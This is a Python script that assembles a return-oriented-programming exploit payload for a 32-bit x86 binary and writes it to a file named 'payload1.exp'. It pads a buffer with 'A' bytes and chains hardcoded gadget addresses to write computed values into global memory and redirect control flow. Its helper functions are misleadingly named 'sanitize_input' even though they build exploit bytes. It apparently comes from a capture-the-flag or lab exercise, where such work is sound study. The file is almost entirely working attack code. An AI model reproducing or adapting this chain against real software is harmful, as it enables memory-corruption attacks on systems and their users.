
def sanitize_input(exploit_str):
	exploit_str_b = bytes.fromhex(exploit_str)
	exploit_str_split = [exploit_str_b[i:i + 1] for i in range(0, len(exploit_str_b), 1)]
	exploit_str_split.reverse()
	sanitize_exploit_str = b"".join(exploit_str_split) + b""
	return sanitize_exploit_str

def sanitize_input2(exploit_str):
    exploit_str_b = bytes.fromhex(exploit_str)
    exploit_str_split = [exploit_str_b[i:i + 1] for i in range(0, len(exploit_str_b), 1)]
    exploit_str_split.reverse()
    sanitize_exploit_str = b"\n".join(exploit_str_split) + b"\n"
    return sanitize_exploit_str

payload = b"\n"
payload += b'A'*12 + b'\n'
payload += b"A\n"*23

glb = "080e6cc0"
glb_10 = "080e6cd0"
glb_14 = "080e6cd4"
glb_18 = "080e6cd8"
pop_eax = "080b054a"
one = "00000001"
ebx = "080e5000"
xchg_eax_edx = "08074696"
mov_dword_edx_eax = "0805f932"
exit_addr = "080507f0"
pop_ebp = "08049859"
ebp = "080e6ce0"
# payload += sanitize_input2("0805ebf9") #pop edx; pop ebx; ret
# payload += sanitize_input2("080e6cc0") #addr of glb
# payload += sanitize_input2("080e5000") #value to be restored in ebx
# payload += sanitize_input2("080b054a") #pop eax
# payload += sanitize_input2("000002d0") #720
# payload += sanitize_input2("0805f932") #mov dword ptr [edx], eax ; ret
# payload += sanitize_input2("08049eb7") 
payload += sanitize_input2(pop_eax)
payload += sanitize_input2(glb_18)
payload += sanitize_input2(xchg_eax_edx)
payload += sanitize_input2(pop_eax)
payload += sanitize_input2(glb_14)
payload += sanitize_input2(mov_dword_edx_eax)
payload += sanitize_input2(pop_eax)
payload += sanitize_input2(glb_10)
payload += sanitize_input2(xchg_eax_edx)
payload += sanitize_input2(pop_eax)
payload += sanitize_input2(exit_addr)
payload += sanitize_input2(mov_dword_edx_eax)
payload += sanitize_input2("080b054a") #pop eax,1
payload += sanitize_input2(glb) 
payload += sanitize_input2("08098db8") #mov ecx, eax
payload += sanitize_input2("0805ebf9") #pop edx, 1, pop ebx, original
payload += sanitize_input2("00000001") 
payload += sanitize_input2("080e5000") 
payload += sanitize_input2("080b054a") #pop eax, 1
payload += sanitize_input2(one) 
repeat = sanitize_input2("08088a9e")#inc eax
repeat += sanitize_input2("08088b4d")#dword[ecx]=eax, pop ebx
repeat += sanitize_input2(ebx)
repeat += sanitize_input2("08062abe") #xchg eax, edi
repeat += sanitize_input2("0805c66e") #mov eax, edx
repeat += sanitize_input2("0806b2d8") #imul ; pop ebx
repeat += sanitize_input2("080e5000") 
repeat += sanitize_input2("08074696") #xchg eax, edx
repeat += sanitize_input2("08062abe") #xchg eax, edi
payload += repeat*5
payload += sanitize_input2("08074696") #xchg eax, edx
payload += sanitize_input2("0805ebf9") #pop edx
payload += sanitize_input2(glb) #addr of glb
payload += sanitize_input2(ebx) #value to be restored in ebx
payload += sanitize_input2("0805f932") #dword ptr[edx] = eax
payload += sanitize_input2(pop_ebp)
payload += sanitize_input2(ebp)
payload += sanitize_input2("08049eed") 
payload += b"A"*12 + sanitize_input("000009")

exp_file_name = "payload1.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()
